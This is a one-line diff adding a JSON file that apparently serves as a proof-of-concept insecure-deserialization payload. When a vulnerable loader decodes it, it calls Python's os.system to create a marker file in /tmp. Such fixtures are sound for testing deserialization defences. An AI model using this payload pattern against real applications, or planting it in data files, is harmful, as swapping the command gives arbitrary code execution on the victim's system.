@@ -1,0 +1,1 @@
+{"py/object": "os.system", "py/newargs": ["touch /tmp/PWNED_MARKER"]}
